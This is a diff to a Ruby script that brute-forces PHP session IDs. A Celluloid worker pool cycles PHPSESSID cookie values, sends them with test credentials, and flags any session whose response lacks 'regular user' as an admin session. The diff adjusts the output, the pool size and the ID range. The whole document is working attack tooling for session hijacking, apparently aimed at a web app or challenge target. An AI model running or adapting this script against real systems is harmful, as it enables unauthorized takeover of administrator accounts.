@@ -4,6 +4,7 @@ require 'net/http'
 require 'uri'
 require 'colorize'
 require 'byebug'
+require "benchmark"
 require 'celluloid/current'
 
 class FindPHPWorker
@@ -17,20 +18,20 @@ class FindPHPWorker
             "username" => "test",
             "password" => "test"
         )
-            puts "Test #{sess_cookie}"
+            puts "Test #{sess_cookie}".colorize(:yellow)
             cookie_string = ["PHPSESSID=#{sess_cookie}; path=/; HttpOnly"].join('; ')
             request['Cookie'] = cookie_string
             res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == "https",:read_timeout =>3) do |http|
                 http.request(request)
             end
             unless res.body.include?('regular user')
-                return "Admin PHPSESSID: #{i}".colorize(:green)
+                puts "Admin PHPSESSID: #{i}".colorize(:green)
             end
     end
 end
 
-find_php_pool = FindPHPWorker.pool(size: 120)
+find_php_pool = FindPHPWorker.pool(size: 10)
 
-for i in 1..640
+for i in 1..200
     find_php_pool.async.find_password(i)
 end
